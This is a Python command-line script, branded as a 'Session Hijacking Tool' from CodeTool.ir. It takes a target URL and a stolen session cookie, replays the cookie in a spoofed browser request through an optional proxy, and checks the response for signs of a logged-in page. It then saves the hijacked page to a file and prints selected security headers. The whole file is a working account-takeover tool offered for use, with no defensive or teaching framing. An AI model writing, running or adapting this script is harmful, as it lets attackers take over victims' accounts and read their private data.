import httpx
import argparse
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)


def show_banner():
    print(Fore.CYAN + r"""
 ██████  ██████  ██████  ███████ ████████  ██████   ██████  ██          ███████ ███████  ██████ ██    ██ ██████  ██ ████████ ██    ██ 
██      ██    ██ ██   ██ ██         ██    ██    ██ ██    ██ ██          ██      ██      ██      ██    ██ ██   ██ ██    ██     ██  ██  
██      ██    ██ ██   ██ █████      ██    ██    ██ ██    ██ ██          ███████ █████   ██      ██    ██ ██████  ██    ██      ████   
██      ██    ██ ██   ██ ██         ██    ██    ██ ██    ██ ██               ██ ██      ██      ██    ██ ██   ██ ██    ██       ██    
 ██████  ██████  ██████  ███████    ██     ██████   ██████  ███████     ███████ ███████  ██████  ██████  ██   ██ ██    ██       ██   
    """)
    print(Fore.YELLOW + "Session Hijacking Tool v1.0 CodeTool.ir")
    print(Fore.WHITE + "-" * 50)
    print(Fore.WHITE + "-" * 50 + Style.RESET_ALL)

async def hijack_session(target_url: str, stolen_cookie: str, proxy: str = None) -> None:
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Cookie': stolen_cookie,
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    client_params = {
        'timeout': 30.0,
        'follow_redirects': True,
        'http2': True
    }
    
    if proxy:
        client_params['proxy'] = proxy
    
    try:
        async with httpx.AsyncClient(**client_params) as client:
            response = await client.get(target_url, headers=headers)
            
            if response.status_code == 200:
                print("[+] Session Hijacking Successful!")
                print(f"[+] Target: {target_url}")
                print(f"[+] Protocol: {response.http_version}")
                print(f"[+] Response Time: {response.elapsed.total_seconds():.2f}s")
                
                
                domain = urlparse(target_url).netloc
                sensitive_keywords = ['logout', 'profile', 'dashboard', 'settings']
                
                found_keywords = [
                    kw for kw in sensitive_keywords 
                    if kw in response.text.lower()
                ]
                
                if found_keywords:
                    print(f"[+] Found sensitive keywords: {', '.join(found_keywords)}")
                
                
                filename = f"hijacked_{domain.replace('.', '_')}.html"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                print(f"[+] Response saved to: {filename}")
                
                
                print("\n[+] Response Headers:")
                for header, value in response.headers.items():
                    if header.lower() in ['set-cookie', 'x-frame-options', 'content-security-policy']:
                        print(f"  {header}: {value}")
            else:
                print(f"[-] Request failed with status: {response.status_code}")
                
    except httpx.HTTPError as e:
        print(f"[-] HTTP Error: {str(e)}")
    except Exception as e:
        print(f"[-] Unexpected Error: {str(e)}")

if __name__ == "__main__":
    show_banner()
    
    parser = argparse.ArgumentParser(
        description="Session Hijacking Tool v1.0 CodeTool.ir",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com/dashboard)")
    parser.add_argument("-c", "--cookie", required=True, help="Stolen session cookie")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    
    args = parser.parse_args()
    
    import asyncio
    asyncio.run(hijack_session(args.url, args.cookie, args.proxy))
